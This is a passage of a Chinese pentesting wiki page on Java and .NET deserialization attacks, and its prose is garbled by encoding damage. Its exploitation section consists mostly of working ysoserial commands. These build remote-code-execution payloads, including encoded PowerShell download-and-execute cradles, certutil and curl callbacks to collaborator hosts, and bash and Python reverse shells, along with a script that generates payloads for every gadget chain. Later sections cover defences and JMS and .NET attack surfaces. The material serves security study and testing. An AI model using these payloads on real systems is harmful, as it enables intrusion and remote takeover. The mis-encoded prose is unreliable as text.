ä½¿ç”¨Burpæ‰©å±•ç¨‹åº[Java Deserialization Scanner](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner)ï¼Œæ‚¨å¯ä»¥**è¯†åˆ«å¯åˆ©ç”¨ysoserialè¿›è¡Œæ”»å‡»çš„æ˜“å—æ”»å‡»çš„åº“**ã€‚\
[**é˜…è¯»æ­¤å¤„ä»¥äº†è§£æœ‰å…³Java Deserialization Scannerçš„æ›´å¤šä¿¡æ¯ã€‚**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner)\
Java Deserialization Scannerä¸“æ³¨äº**`ObjectInputStream`**ååºåˆ—åŒ–ã€‚

æ‚¨è¿˜å¯ä»¥ä½¿ç”¨[Freddy](https://github.com/nccgroup/freddy)åœ¨Burpä¸­**æ£€æµ‹ååºåˆ—åŒ–**æ¼æ´ã€‚è¯¥æ’ä»¶å°†æ£€æµ‹ä¸**ä¸ä»…`ObjectInputStream`ç›¸å…³çš„æ¼æ´**ï¼Œè¿˜æœ‰ä¸**Json**å’Œ**Yml**ååºåˆ—åŒ–åº“ç›¸å…³çš„æ¼æ´ã€‚åœ¨ä¸»åŠ¨æ¨¡å¼ä¸‹ï¼Œå®ƒå°†å°è¯•ä½¿ç”¨sleepæˆ–DNSæœ‰æ•ˆè½½è·æ¥ç¡®è®¤æ¼æ´ã€‚\
[**æ‚¨å¯ä»¥åœ¨æ­¤å¤„æ‰¾åˆ°æœ‰å…³Freddyçš„æ›´å¤šä¿¡æ¯ã€‚**](https://www.nccgroup.com/us/about-us/newsroom-and-events/blog/2018/june/finding-deserialisation-issues-has-never-been-easier-freddy-the-serialisation-killer/)

**åºåˆ—åŒ–æµ‹è¯•**

å¹¶ä¸ä»…ä»…æ˜¯æ£€æŸ¥æœåŠ¡å™¨æ˜¯å¦ä½¿ç”¨äº†ä»»ä½•æ˜“å—æ”»å‡»çš„åº“ã€‚æœ‰æ—¶ï¼Œæ‚¨å¯ä»¥**æ›´æ”¹åºåˆ—åŒ–å¯¹è±¡ä¸­çš„æ•°æ®å¹¶ç»•è¿‡æŸäº›æ£€æŸ¥**ï¼ˆä¾‹å¦‚ï¼Œåœ¨Webåº”ç”¨ç¨‹åºä¸­æˆäºˆç®¡ç†å‘˜æƒé™ï¼‰ã€‚\
å¦‚æœæ‚¨å‘ç°ä¸€ä¸ªJavaåºåˆ—åŒ–å¯¹è±¡è¢«å‘é€åˆ°Webåº”ç”¨ç¨‹åºï¼Œ**æ‚¨å¯ä»¥ä½¿ç”¨SerializationDumperæ¥ä»¥æ›´æ˜“è¯»çš„æ ¼å¼æ‰“å°å‘é€çš„åºåˆ—åŒ–å¯¹è±¡**ã€‚äº†è§£æ‚¨å‘é€çš„æ•°æ®å°†æ›´å®¹æ˜“ä¿®æ”¹å®ƒå¹¶ç»•è¿‡æŸäº›æ£€æŸ¥ã€‚

### **åˆ©ç”¨**

#### **ysoserial**

æœ€è‘—åçš„åˆ©ç”¨Javaååºåˆ—åŒ–çš„å·¥å…·æ˜¯[ysoserial](https://github.com/frohoff/ysoserial)ï¼ˆ[åœ¨æ­¤ä¸‹è½½](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)ï¼‰ã€‚æ‚¨è¿˜å¯ä»¥è€ƒè™‘ä½¿ç”¨[ysoseral-modified](https://github.com/pimps/ysoserial-modified)ï¼Œå®ƒå…è®¸æ‚¨ä½¿ç”¨å¤æ‚çš„å‘½ä»¤ï¼ˆä¾‹å¦‚ä½¿ç”¨ç®¡é“ï¼‰ã€‚\
è¯·æ³¨æ„ï¼Œæ­¤å·¥å…·**ä¸“æ³¨äºåˆ©ç”¨`ObjectInputStream`**ã€‚\
æˆ‘å»ºè®®æ‚¨åœ¨ä½¿ç”¨RCEæœ‰æ•ˆè½½è·ä¹‹å‰ï¼Œå…ˆä½¿ç”¨"URLDNS"æœ‰æ•ˆè½½è·æ¥æµ‹è¯•æ˜¯å¦å¯èƒ½è¿›è¡Œæ³¨å…¥ã€‚æ— è®ºå¦‚ä½•ï¼Œè¯·æ³¨æ„å¯èƒ½"URLDNS"æœ‰æ•ˆè½½è·ä¸èµ·ä½œç”¨ï¼Œä½†å…¶ä»–RCEæœ‰æ•ˆè½½è·å¯èƒ½èµ·ä½œç”¨ã€‚
```bash
# PoC to make the application perform a DNS req
java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://b7j40108s43ysmdpplgd3b7rdij87x.burpcollaborator.net > payload

# PoC RCE in Windows
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 'cmd /c ping -n 5 127.0.0.1' > payload
# Time, I noticed the response too longer when this was used
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c timeout 5" > payload
# Create File
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c echo pwned> C:\\\\Users\\\\username\\\\pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c nslookup jvikwa34jwgftvoxdz16jhpufllb90.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c certutil -urlcache -split -f http://j4ops7g6mi9w30verckjrk26txzqnf.burpcollaborator.net/a a"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAYwBlADcAMABwAG8AbwB1ADAAaABlAGIAaQAzAHcAegB1AHMAMQB6ADIAYQBvADEAZgA3ADkAdgB5AC4AYgB1AHIAcABjAG8AbABsAGEAYgBvAHIAYQB0AG8AcgAuAG4AZQB0AC8AYQAnACkA"
## In the ast http request was encoded: IEX(New-Object Net.WebClient).downloadString('http://1ce70poou0hebi3wzus1z2ao1f79vy.burpcollaborator.net/a')
## To encode something in Base64 for Windows PS from linux you can use: echo -n "<PAYLOAD>" | iconv --to-code UTF-16LE | base64 -w0
# Reverse Shell
## Encoded: IEX(New-Object Net.WebClient).downloadString('http://192.168.1.4:8989/powercat.ps1')
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA6ADgAOQA4ADkALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkA"

#PoC RCE in Linux
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "ping -c 5 192.168.1.4" > payload
# Time
## Using time in bash I didn't notice any difference in the timing of the response
# Create file
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "touch /tmp/pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "dig ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "nslookup ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "curl ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net" > payload
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "wget ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# Reverse shell
## Encoded: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" | base64 -w0
## Encoded: export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,ZXhwb3J0IFJIT1NUPSIxMjcuMC4wLjEiO2V4cG9ydCBSUE9SVD0xMjM0NTtweXRob24gLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vc2giKSc=}|{base64,-d}|{bash,-i}"
# å°†è´Ÿè½½ä»¥base64ç¼–ç 
base64 -w0 è´Ÿè½½
åœ¨åˆ›å»º**java.lang.Runtime.exec()**çš„æœ‰æ•ˆè½½è·æ—¶ï¼Œ**ä¸èƒ½ä½¿ç”¨ç‰¹æ®Šå­—ç¬¦**ï¼Œå¦‚â€œ>â€æˆ–â€œ|â€æ¥é‡å®šå‘æ‰§è¡Œçš„è¾“å‡ºï¼Œâ€œ$()â€æ¥æ‰§è¡Œå‘½ä»¤ï¼Œç”šè‡³**é€šè¿‡ç©ºæ ¼**æ¥ä¼ é€’å‚æ•°ç»™å‘½ä»¤ï¼ˆä½ å¯ä»¥ä½¿ç”¨`echo -n "hello world"`ï¼Œä½†ä¸èƒ½ä½¿ç”¨`python2 -c 'print "Hello world"'`ï¼‰ã€‚ä¸ºäº†æ­£ç¡®ç¼–ç æœ‰æ•ˆè½½è·ï¼Œä½ å¯ä»¥[ä½¿ç”¨è¿™ä¸ªç½‘é¡µ](http://www.jackson-t.ca/runtime-exec-payloads.html)ã€‚

è¯·éšæ„ä½¿ç”¨ä¸‹é¢çš„è„šæœ¬åˆ›å»ºé€‚ç”¨äºWindowså’ŒLinuxçš„**æ‰€æœ‰å¯èƒ½çš„ä»£ç æ‰§è¡Œ**æœ‰æ•ˆè½½è·ï¼Œç„¶ååœ¨æ˜“å—æ”»å‡»çš„ç½‘é¡µä¸Šè¿›è¡Œæµ‹è¯•ï¼š
```python
import os
import base64

# You may need to update the payloads
payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 'MozillaRhino1', 'MozillaRhino2', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1', 'Spring2', 'Vaadin1', 'Wicket1']
def generate(name, cmd):
for payload in payloads:
final = cmd.replace('REPLACE', payload)
print 'Generating ' + payload + ' for ' + name + '...'
command = os.popen('java -jar ysoserial.jar ' + payload + ' "' + final + '"')
result = command.read()
command.close()
encoded = base64.b64encode(result)
if encoded != "":
open(name + '_intruder.txt', 'a').write(encoded + '\n')

generate('Windows', 'ping -n 1 win.REPLACE.server.local')
generate('Linux', 'ping -c 1 nix.REPLACE.server.local')
```
#### serialkillerbypassgadgets

æ‚¨å¯ä»¥ä½¿ç”¨[https://github.com/pwntester/SerialKillerBypassGadgetCollection](https://github.com/pwntester/SerialKillerBypassGadgetCollection)ä¸ysoserialä¸€èµ·åˆ›å»ºæ›´å¤šçš„æ¼æ´åˆ©ç”¨ã€‚æœ‰å…³è¯¥å·¥å…·çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜…æ¼”è®²çš„å¹»ç¯ç‰‡ï¼š[https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1](https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1)

#### marshalsec

[marshalsec](https://github.com/mbechler/marshalsec)å¯ç”¨äºç”Ÿæˆç”¨äºåˆ©ç”¨Javaä¸­ä¸åŒçš„Jsonå’ŒYmlåºåˆ—åŒ–åº“çš„æœ‰æ•ˆè½½è·ã€‚ä¸ºäº†ç¼–è¯‘è¯¥é¡¹ç›®ï¼Œæˆ‘éœ€è¦å°†ä»¥ä¸‹ä¾èµ–é¡¹æ·»åŠ åˆ°`pom.xml`ä¸­ï¼š
```markup
<dependency>
<groupId>javax.activation</groupId>
<artifactId>activation</artifactId>
<version>1.1.1</version>
</dependency>

<dependency>
<groupId>com.sun.jndi</groupId>
<artifactId>rmiregistry</artifactId>
<version>1.2.1</version>
<type>pom</type>
</dependency>
```
**å®‰è£…maven**ï¼Œå¹¶**ç¼–è¯‘**é¡¹ç›®ï¼š
```bash
sudo apt-get install maven
mvn clean package -DskipTests
```
#### FastJSON

äº†è§£æ›´å¤šå…³äºè¿™ä¸ªJava JSONåº“çš„ä¿¡æ¯ï¼š[https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html](https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html)

### å®éªŒå®¤

* å¦‚æœä½ æƒ³æµ‹è¯•ä¸€äº›ysoserialçš„æœ‰æ•ˆè½½è·ï¼Œä½ å¯ä»¥**è¿è¡Œè¿™ä¸ªwebåº”ç”¨ç¨‹åº**ï¼š[https://github.com/hvqzao/java-deserialize-webapp](https://github.com/hvqzao/java-deserialize-webapp)
* [https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)

### ä¸ºä»€ä¹ˆ

Javaéå¸¸å–œæ¬¢åœ¨å„ä¸ªåœ°æ–¹å‘é€åºåˆ—åŒ–å¯¹è±¡ã€‚ä¾‹å¦‚ï¼š

* åœ¨**HTTPè¯·æ±‚**ä¸­ - å‚æ•°ã€ViewStateã€Cookiesç­‰ç­‰ã€‚
* **RMI** - å¹¿æ³›ä½¿ç”¨çš„Java RMIåè®®å®Œå…¨åŸºäºåºåˆ—åŒ–ã€‚
* **RMI over HTTP** - è®¸å¤šJavaåšå®¢æˆ·ç«¯Webåº”ç”¨ç¨‹åºä½¿ç”¨æ­¤åè®® - å†æ¬¡æ˜¯100%çš„åºåˆ—åŒ–å¯¹è±¡ã€‚
* **JMX** - åŒæ ·ï¼Œä¾èµ–äºé€šè¿‡ç½‘ç»œå‘é€çš„åºåˆ—åŒ–å¯¹è±¡ã€‚
* **è‡ªå®šä¹‰åè®®** - å‘é€å’Œæ¥æ”¶åŸå§‹Javaå¯¹è±¡æ˜¯å¸¸æ€ - æˆ‘ä»¬å°†åœ¨å³å°†åˆ°æ¥çš„ä¸€äº›åˆ©ç”¨ä¸­çœ‹åˆ°ã€‚

### é¢„é˜²

#### ç¬æ€å¯¹è±¡

å®ç°`Serializable`æ¥å£çš„ç±»å¯ä»¥å°†ç±»å†…éƒ¨ä¸åº”è¯¥è¢«åºåˆ—åŒ–çš„ä»»ä½•å¯¹è±¡æ ‡è®°ä¸º`transient`ã€‚ä¾‹å¦‚ï¼š
```java
public class myAccount implements Serializable
{
private transient double profit; // declared transient
private transient double margin; // declared transient
```
#### é¿å…å¯¹éœ€è¦å®ç°Serializableæ¥å£çš„ç±»è¿›è¡Œåºåˆ—åŒ–

ç”±äºç±»çš„å±‚æ¬¡ç»“æ„ï¼Œä½ çš„ä¸€äº›åº”ç”¨å¯¹è±¡å¯èƒ½è¢«å¼ºåˆ¶å®ç°`Serializable`æ¥å£ã€‚ä¸ºäº†ç¡®ä¿ä½ çš„åº”ç”¨å¯¹è±¡æ— æ³•è¢«ååºåˆ—åŒ–ï¼Œåº”è¯¥å£°æ˜ä¸€ä¸ª`readObject()`æ–¹æ³•ï¼ˆå¸¦æœ‰`final`ä¿®é¥°ç¬¦ï¼‰ï¼Œè¯¥æ–¹æ³•å§‹ç»ˆæŠ›å‡ºå¼‚å¸¸ï¼š
```java
private final void readObject(ObjectInputStream in) throws java.io.IOException {
throw new java.io.IOException("Cannot be deserialized");
}
```
#### åœ¨ååºåˆ—åŒ–ä¹‹å‰æ£€æŸ¥ååºåˆ—åŒ–çš„ç±»

`java.io.ObjectInputStream` ç±»ç”¨äºååºåˆ—åŒ–å¯¹è±¡ã€‚é€šè¿‡å¯¹å…¶è¿›è¡Œå­ç±»åŒ–ï¼Œå¯ä»¥åŠ å¼ºå…¶è¡Œä¸ºã€‚å¦‚æœæ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼Œåˆ™è¿™æ˜¯æœ€ä½³è§£å†³æ–¹æ¡ˆï¼š

* æ‚¨å¯ä»¥æ›´æ”¹æ‰§è¡Œååºåˆ—åŒ–çš„ä»£ç 
* æ‚¨çŸ¥é“å¸Œæœ›ååºåˆ—åŒ–çš„ç±»æ˜¯å“ªäº›

æ€»ä½“æ€è·¯æ˜¯é‡å†™ [`ObjectInputStream.html#resolveClass()`](https://docs.oracle.com/javase/7/docs/api/java/io/ObjectInputStream.html#resolveClass\(java.io.ObjectStreamClass\)) æ–¹æ³•ï¼Œä»¥é™åˆ¶å…è®¸ååºåˆ—åŒ–çš„ç±»ã€‚

ç”±äºæ­¤è°ƒç”¨å‘ç”Ÿåœ¨è°ƒç”¨ `readObject()` ä¹‹å‰ï¼Œæ‚¨å¯ä»¥ç¡®ä¿é™¤éæ˜¯æ‚¨å¸Œæœ›å…è®¸çš„ç±»å‹ï¼Œå¦åˆ™ä¸ä¼šå‘ç”Ÿä»»ä½•ååºåˆ—åŒ–æ´»åŠ¨ã€‚

ä¸‹é¢æ˜¯ä¸€ä¸ªç®€å•çš„ç¤ºä¾‹ï¼Œå…¶ä¸­ `LookAheadObjectInputStream` ç±»ä¿è¯åªååºåˆ—åŒ– `Bicycle` ç±»å‹ï¼š
```java
public class LookAheadObjectInputStream extends ObjectInputStream {

public LookAheadObjectInputStream(InputStream inputStream) throws IOException {
super(inputStream);
}

/**
* Only deserialize instances of our expected Bicycle class
*/
@Override
protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
if (!desc.getName().equals(Bicycle.class.getName())) {
throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
}
return super.resolveClass(desc);
}
}
```
**ä½¿ç”¨ä»£ç†åŠ å›ºæ‰€æœ‰java.io.ObjectInputStreamçš„ä½¿ç”¨**

å¦‚æœä½ ä¸æ‹¥æœ‰ä»£ç æˆ–è€…ä¸èƒ½ç­‰å¾…ä¿®è¡¥ç¨‹åºï¼Œä½¿ç”¨ä»£ç†æ¥ç¼–ç»‡å¯¹`java.io.ObjectInputStream`çš„åŠ å›ºæ˜¯æœ€å¥½çš„è§£å†³æ–¹æ¡ˆã€‚\
ä½¿ç”¨è¿™ç§æ–¹æ³•ï¼Œä½ åªèƒ½å°†å·²çŸ¥çš„æ¶æ„ç±»å‹åˆ—å…¥é»‘åå•ï¼Œè€Œä¸èƒ½å°†å®ƒä»¬åˆ—å…¥ç™½åå•ï¼Œå› ä¸ºä½ ä¸çŸ¥é“å“ªäº›å¯¹è±¡æ­£åœ¨è¢«åºåˆ—åŒ–ã€‚

è¦å¯ç”¨è¿™äº›ä»£ç†ï¼Œåªéœ€æ·»åŠ ä¸€ä¸ªæ–°çš„JVMå‚æ•°ï¼š
```
-javaagent:name-of-agent.jar
```
### å‚è€ƒèµ„æ–™

* ååºåˆ—åŒ–å’Œysoserialè®²åº§ï¼š[http://frohoff.github.io/appseccali-marshalling-pickles/](http://frohoff.github.io/appseccali-marshalling-pickles/)
* [https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)
* [https://www.youtube.com/watch?v=VviY3O-euVQ](https://www.youtube.com/watch?v=VviY3O-euVQ)
* å…³äºgadgetinspectorçš„è®²åº§ï¼š[https://www.youtube.com/watch?v=wPbW6zQ52w8](https://www.youtube.com/watch?v=wPbW6zQ52w8) å’Œå¹»ç¯ç‰‡ï¼š[https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf](https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf)
* Marshalsecè®ºæ–‡ï¼š[https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true](https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true)
* [https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr](https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr)
* [https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)
* [https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html](https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html)
* Javaå’Œ.Net JSONååºåˆ—åŒ–**è®ºæ–‡ï¼š**[**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**ï¼Œ**è®²åº§ï¼š[https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) å’Œå¹»ç¯ç‰‡ï¼š[https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* ååºåˆ—åŒ–CVEï¼š[https://paper.seebug.org/123/](https://paper.seebug.org/123/)

## JNDIæ³¨å…¥å’Œlog4Shell

åœ¨ä»¥ä¸‹é¡µé¢ä¸­æ‰¾åˆ°**JNDIæ³¨å…¥æ˜¯ä»€ä¹ˆï¼Œå¦‚ä½•é€šè¿‡RMIã€CORBAå’ŒLDAPæ»¥ç”¨å®ƒä»¥åŠå¦‚ä½•åˆ©ç”¨log4shell**ï¼ˆä»¥åŠæ­¤æ¼æ´çš„ç¤ºä¾‹ï¼‰ï¼š

{% content-ref url="jndi-java-naming-and-directory-interface-and-log4shell.md" %}
[jndi-java-naming-and-directory-interface-and-log4shell.md](jndi-java-naming-and-directory-interface-and-log4shell.md)
{% endcontent-ref %}

## JMS - Javaæ¶ˆæ¯æœåŠ¡

> **Javaæ¶ˆæ¯æœåŠ¡**ï¼ˆ**JMS**ï¼‰APIæ˜¯ç”¨äºåœ¨ä¸¤ä¸ªæˆ–å¤šä¸ªå®¢æˆ·ç«¯ä¹‹é—´å‘é€æ¶ˆæ¯çš„Javaé¢å‘æ¶ˆæ¯çš„ä¸­é—´ä»¶APIã€‚å®ƒæ˜¯å¤„ç†ç”Ÿäº§è€…-æ¶ˆè´¹è€…é—®é¢˜çš„å®ç°ã€‚JMSæ˜¯Javaå¹³å°ä¼ä¸šç‰ˆï¼ˆJava EEï¼‰çš„ä¸€éƒ¨åˆ†ï¼Œå¹¶ç”±Sun Microsystemså¼€å‘çš„è§„èŒƒæŒ‡å¯¼ï¼Œä½†ç°åœ¨ç”±Javaç¤¾åŒºè¿›ç¨‹æŒ‡å¯¼ã€‚å®ƒæ˜¯ä¸€ç§å…è®¸åŸºäºJava EEçš„åº”ç”¨ç¨‹åºç»„ä»¶åˆ›å»ºã€å‘é€ã€æ¥æ”¶å’Œè¯»å–æ¶ˆæ¯çš„æ¶ˆæ¯æ ‡å‡†ã€‚å®ƒå…è®¸åˆ†å¸ƒå¼åº”ç”¨ç¨‹åºçš„ä¸åŒç»„ä»¶ä¹‹é—´çš„é€šä¿¡æ¾æ•£è€¦åˆã€å¯é å’Œå¼‚æ­¥ã€‚ï¼ˆæ¥è‡ª[Wikipedia](https://en.wikipedia.org/wiki/Java\_Message\_Service)ï¼‰ã€‚

### äº§å“

æœ‰å‡ ä¸ªä½¿ç”¨æ­¤ä¸­é—´ä»¶å‘é€æ¶ˆæ¯çš„äº§å“ï¼š

![](<../../.gitbook/assets/image (291).png>)

![](<../../.gitbook/assets/image (292).png>)

### åˆ©ç”¨

å› æ­¤ï¼ŒåŸºæœ¬ä¸Šæœ‰ä¸€äº›**ä½¿ç”¨JMSçš„æœåŠ¡ä»¥å±é™©çš„æ–¹å¼**ã€‚å› æ­¤ï¼Œå¦‚æœæ‚¨æœ‰**è¶³å¤Ÿçš„æƒé™**å‘è¿™äº›æœåŠ¡å‘é€æ¶ˆæ¯ï¼ˆé€šå¸¸éœ€è¦æœ‰æ•ˆçš„å‡­æ®ï¼‰ï¼Œæ‚¨å¯èƒ½èƒ½å¤Ÿå‘é€**æ¶æ„å¯¹è±¡åºåˆ—åŒ–ï¼Œè¿™äº›å¯¹è±¡å°†ç”±æ¶ˆè´¹è€…/è®¢é˜…è€…è¿›è¡Œååºåˆ—åŒ–**ã€‚\
è¿™æ„å‘³ç€åœ¨æ­¤åˆ©ç”¨ä¸­ï¼Œæ‰€æœ‰**å°†ä½¿ç”¨è¯¥æ¶ˆæ¯çš„å®¢æˆ·ç«¯éƒ½å°†è¢«æ„ŸæŸ“**ã€‚

æ‚¨åº”è¯¥è®°ä½ï¼Œå³ä½¿æœåŠ¡å­˜åœ¨æ¼æ´ï¼ˆå› ä¸ºå®ƒä¸å®‰å…¨åœ°ååºåˆ—åŒ–ç”¨æˆ·è¾“å…¥ï¼‰ï¼Œæ‚¨ä»ç„¶éœ€è¦æ‰¾åˆ°æœ‰æ•ˆçš„gadgetsæ¥åˆ©ç”¨è¯¥æ¼æ´ã€‚

å·¥å…·[JMET](https://github.com/matthiaskaiser/jmet)è¢«åˆ›å»ºç”¨äº**è¿æ¥å’Œæ”»å‡»è¿™äº›æœåŠ¡ï¼Œå‘é€ä½¿ç”¨å·²çŸ¥gadgetsåºåˆ—åŒ–çš„å¤šä¸ªæ¶æ„å¯¹è±¡**ã€‚å¦‚æœæœåŠ¡ä»ç„¶å­˜åœ¨æ¼æ´ï¼Œå¹¶ä¸”ä½¿ç”¨çš„ä»»ä½•gadgetséƒ½åœ¨æ˜“å—æ”»å‡»çš„åº”ç”¨ç¨‹åºä¸­ï¼Œè¿™äº›åˆ©ç”¨å°†èµ·ä½œç”¨ã€‚

### å‚è€ƒèµ„æ–™

* JMETè®²åº§ï¼š[https://www.youtube.com/watch?v=0h8DWiOWGGA](https://www.youtube.com/watch?v=0h8DWiOWGGA)
* å¹»ç¯ç‰‡ï¼š[https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf)

## .Net

ä¸Javaç±»ä¼¼ï¼Œ.Netåœ¨ååºåˆ—åŒ–åˆ©ç”¨æ–¹é¢çš„å·¥ä½œæ–¹å¼ä¹Ÿæ˜¯ç›¸ä¼¼çš„ï¼š**åˆ©ç”¨**å°†**æ»¥ç”¨gadgets**ï¼Œå½“å¯¹è±¡**ååºåˆ—åŒ–**æ—¶æ‰§è¡Œä¸€äº›æœ‰è¶£çš„**ä»£ç **ã€‚
### æŒ‡çº¹è¯†åˆ«

#### WhiteBox

åœ¨æºä»£ç ä¸­æœç´¢ä»¥ä¸‹æœ¯è¯­ï¼š

1. `TypeNameHandling`
2. `JavaScriptTypeResolver`

æŸ¥æ‰¾ä»»ä½•ç”±ç”¨æˆ·æ§åˆ¶çš„å˜é‡è®¾ç½®ç±»å‹çš„åºåˆ—åŒ–å™¨ã€‚

#### BlackBox

æ‚¨å¯ä»¥æœç´¢Base64ç¼–ç çš„å­—ç¬¦ä¸²**AAEAAAD/////**æˆ–ä»»ä½•å…¶ä»–å¯èƒ½åœ¨åç«¯è¿›è¡Œååºåˆ—åŒ–çš„å†…å®¹ï¼Œå¹¶å…è®¸æ‚¨æ§åˆ¶ååºåˆ—åŒ–çš„ç±»å‹ã€‚ä¾‹å¦‚ï¼ŒåŒ…å«`TypeObject`æˆ–`$type`çš„**JSON**æˆ–**XML**ã€‚

### ysoserial.net

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨å·¥å…·[**ysoserial.net**](https://github.com/pwntester/ysoserial.net)æ¥åˆ›å»ºååºåˆ—åŒ–åˆ©ç”¨ã€‚ä¸‹è½½gitå­˜å‚¨åº“åï¼Œæ‚¨åº”è¯¥ä½¿ç”¨Visual Studioç­‰å·¥å…·**ç¼–è¯‘è¯¥å·¥å…·**ã€‚

å¦‚æœæ‚¨æƒ³äº†è§£**ysoserial.netå¦‚ä½•åˆ›å»ºå…¶åˆ©ç”¨**ï¼Œæ‚¨å¯ä»¥[**æŸ¥çœ‹æ­¤é¡µé¢ï¼Œå…¶ä¸­è§£é‡Šäº†ObjectDataProvider gadget + ExpandedWrapper + Json.Net formatter**](basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md)ã€‚

